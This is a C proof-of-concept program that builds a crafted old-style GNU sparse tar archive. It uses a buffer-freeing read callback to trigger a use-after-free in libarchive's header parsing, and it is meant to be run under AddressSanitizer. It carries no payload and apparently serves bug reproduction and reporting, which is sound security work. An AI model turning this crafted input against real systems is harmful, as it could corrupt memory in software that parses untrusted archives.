/*
 * PoC: use-after-free while reading an old-style GNU sparse tar header.
 *
 * Drives the public libarchive read API with a client read callback that
 * returns each 512-byte block in a freshly allocated buffer and frees the
 * previous one between calls (a perfectly legal client contract: the buffer
 * handed back from one read need not survive the next).
 *
 * The crafted archive is a single GNU-format entry that uses the old-style
 * sparse layout with an "extended" sparse block.  Parsing the extended block
 * pulls another block through the client callback, which frees the buffer
 * that still backs the main header.  A library that reads the common header
 * fields out of that buffer afterwards touches freed memory.
 *
 * Build (against an ASan build of libarchive):
 *   cc -fsanitize=address -g -I/work/libarchive pocs/residual.c \
 *      build-asan/libarchive.a -o /tmp/residual
 * Run:
 *   /tmp/residual
 */
#include <archive.h>
#include <archive_entry.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BLOCK 512

static void
set_octal(char *field, size_t len, unsigned long long v)
{
	/* Right-justified, zero-padded octal, matching tar's style. */
	size_t i;
	for (i = 0; i < len; i++)
		field[i] = '0';
	i = len - 1;
	while (v != 0 && i != (size_t)-1) {
		field[i] = (char)('0' + (int)(v & 7));
		v >>= 3;
		if (i == 0)
			break;
		i--;
	}
}

static void
build_archive(unsigned char *buf)
{
	unsigned char *h = buf;          /* main header block */
	unsigned char *ext = buf + BLOCK; /* extended sparse block */
	unsigned int sum;
	int i;
	char cksum[8];

	memset(buf, 0, 2 * BLOCK);

	/* name */
	memcpy(h + 0, "sparse", 6);
	/* mode 0644 */
	set_octal((char *)h + 100, 7, 0644);
	/* uid 123, gid 456 */
	set_octal((char *)h + 108, 7, 123);
	set_octal((char *)h + 116, 7, 456);
	/* size 0 */
	set_octal((char *)h + 124, 11, 0);
	/* mtime */
	set_octal((char *)h + 136, 11, 123456789);
	/* typeflag 'S' (GNU sparse) */
	h[156] = 'S';
	/* magic "ustar  \0" => old GNU format */
	memcpy(h + 257, "ustar  ", 7);
	h[264] = '\0';
	/* sparse[0] at offset 386: offset + numbytes */
	set_octal((char *)h + 386, 11, 0);
	set_octal((char *)h + 398, 11, 0);
	/* isextended at offset 482 */
	h[482] = 1;

	/* Compute the header checksum (checksum field treated as spaces). */
	for (i = 0; i < 8; i++)
		h[148 + i] = ' ';
	sum = 0;
	for (i = 0; i < BLOCK; i++)
		sum += h[i];
	snprintf(cksum, sizeof(cksum), "%06o", sum);
	memcpy(h + 148, cksum, 6);
	h[154] = '\0';
	h[155] = ' ';

	/* Extended block: no further sparse entries, no further extension. */
	(void)ext;
}

struct src {
	const unsigned char *data;
	size_t total;
	size_t pos;
	void *last;
};

static la_ssize_t
feed(struct archive *a, void *client_data, const void **buffer)
{
	struct src *s = client_data;
	size_t n;
	void *b;

	(void)a;
	if (s->last != NULL) {
		free(s->last);
		s->last = NULL;
	}
	n = s->total - s->pos;
	if (n == 0)
		return (0);
	if (n > BLOCK)
		n = BLOCK;
	b = malloc(n);
	memcpy(b, s->data + s->pos, n);
	s->pos += n;
	s->last = b;
	*buffer = b;
	return ((la_ssize_t)n);
}

static int
done(struct archive *a, void *client_data)
{
	struct src *s = client_data;
	(void)a;
	if (s->last != NULL) {
		free(s->last);
		s->last = NULL;
	}
	return (ARCHIVE_OK);
}

int
main(void)
{
	unsigned char archive_bytes[2 * BLOCK];
	struct src s;
	struct archive *a;
	struct archive_entry *ae;
	int r;

	build_archive(archive_bytes);

	memset(&s, 0, sizeof(s));
	s.data = archive_bytes;
	s.total = sizeof(archive_bytes);

	a = archive_read_new();
	archive_read_support_format_tar(a);
	r = archive_read_open(a, &s, NULL, feed, done);
	if (r != ARCHIVE_OK) {
		fprintf(stderr, "open failed: %s\n", archive_error_string(a));
		return (2);
	}

	r = archive_read_next_header(a, &ae);
	if (r == ARCHIVE_OK || r == ARCHIVE_WARN)
		printf("read header: %s\n", archive_entry_pathname(ae));
	else
		fprintf(stderr, "next_header: %d %s\n", r, archive_error_string(a));

	archive_read_free(a);
	return (0);
}
